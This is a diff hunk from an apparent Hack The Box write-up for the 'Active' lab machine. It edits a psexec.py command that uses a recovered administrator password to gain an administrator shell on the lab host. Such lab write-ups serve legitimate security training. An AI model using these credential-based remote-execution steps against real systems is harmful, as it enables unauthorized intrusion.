@@ -93,7 +93,7 @@ Password is : Ticketmaster1968
 
 I will gain access as administrator
 
-Python3 psexec.py Administrator@10.10.10.100
+Python3 psexec.py active.htb/Administrator@10.10.10.100
 Password : Ticketmaster1968
 
 Now I have a shell as administrator
